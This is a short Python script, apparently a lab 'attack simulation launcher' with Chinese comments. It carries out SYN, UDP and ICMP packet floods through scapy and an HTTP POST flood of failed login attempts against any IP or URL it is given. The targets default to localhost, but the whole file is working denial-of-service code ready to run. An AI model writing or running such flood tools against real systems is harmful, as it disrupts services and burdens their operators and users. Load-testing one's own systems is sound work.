import argparse
import random
import requests
from scapy.all import IP, TCP, UDP, ICMP, Raw, send

# ------------------------
# TCP SYN Flood
# ------------------------
def syn_flood(target_ip, target_port=80, count=1000):
    print(f"[🚀] 執行 TCP SYN Flood 攻擊: {target_ip}:{target_port} x{count}")
    for _ in range(count):
        pkt = IP(dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        send(pkt, verbose=0)
    print("[✓] TCP SYN Flood 完成")

# ------------------------
# UDP Flood
# ------------------------
def udp_flood(target_ip, target_port=80, count=1000):
    print(f"[🚀] 執行 UDP Flood 攻擊: {target_ip}:{target_port} x{count}")
    for _ in range(count):
        pkt = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="X"*512)
        send(pkt, verbose=0)
    print("[✓] UDP Flood 完成")

# ------------------------
# ICMP Flood
# ------------------------
def icmp_flood(target_ip, count=1000):
    print(f"[🚀] 執行 ICMP Flood 攻擊: {target_ip} x{count}")
    for _ in range(count):
        pkt = IP(dst=target_ip)/ICMP()
        send(pkt, verbose=0)
    print("[✓] ICMP Flood 完成")

# ------------------------
# HTTP POST Flood (暴力登入模擬)
# ------------------------
def http_flood(url, count=1000):
    print(f"[🚀] 執行 HTTP POST Flood 攻擊: {url} x{count}")
    for i in range(count):
        try:
            response = requests.post(url, data={"username": f"user{i}", "password": "wrong"})
            print(f"[{i}] Status: {response.status_code}")
        except Exception as e:
            print(f"[{i}] Error: {e}")
    print("[✓] HTTP POST Flood 完成")

# ------------------------
# 主程式入口
# ------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="🧨 攻擊模擬啟動器 attack_launcher.py")
    parser.add_argument("--type", required=True, choices=["syn", "udp", "icmp", "http"], help="攻擊類型")
    parser.add_argument("--target", default="127.0.0.1", help="目標 IP 或網址")
    parser.add_argument("--port", type=int, default=5000, help="目標 Port（僅限 TCP/UDP）")
    parser.add_argument("--count", type=int, default=1000, help="攻擊次數")
    parser.add_argument("--url", default="http://127.0.0.1:5000", help="HTTP 攻擊的網址")

    args = parser.parse_args()

    if args.type == "syn":
        syn_flood(args.target, args.port, args.count)
    elif args.type == "udp":
        udp_flood(args.target, args.port, args.count)
    elif args.type == "icmp":
        icmp_flood(args.target, args.count)
    elif args.type == "http":
        http_flood(args.url, args.count)
